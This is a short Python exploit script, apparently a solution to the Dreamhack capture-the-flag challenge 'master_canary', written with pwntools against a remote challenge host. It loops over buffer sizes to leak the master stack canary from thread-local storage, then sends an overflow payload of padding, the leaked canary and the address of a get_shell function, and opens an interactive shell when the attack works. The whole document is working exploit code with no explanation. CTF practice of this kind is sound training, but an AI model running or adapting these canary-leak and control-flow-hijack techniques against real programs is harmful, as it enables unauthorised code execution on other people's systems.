from pwn import *

for i in range(0x8e6,0x1000,1):
    p = remote('host1.dreamhack.games', 15652)
    #p = process('./master_canary')
    e = ELF('./master_canary')
    
    #allocate to thread buffer
    p.sendlineafter(b'> ',b'1')

    p.sendlineafter(b'> ',b'2')
    size = i
    p.sendlineafter(b': ', str(size))
    
    p.sendlineafter(b': ',b'A'*size)
    p.recv(0x6+size) #6 for 'Data:' string
    canary = b'\x00'
    canary += p.recv(7)
    
    print(hex(u64(canary)))
    
    pay = b''
    pay += b'A'*(0x30-0x8)
    pay += canary
    pay += b'A'*8
    pay += p64(e.symbols['get_shell'])
    
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'comment: ',pay)
    
    p.sendline(b'id')

    check = p.can_recv(timeout=1)
    print(hex(i))
    if check == True:
        p.interactive()
    p.close()
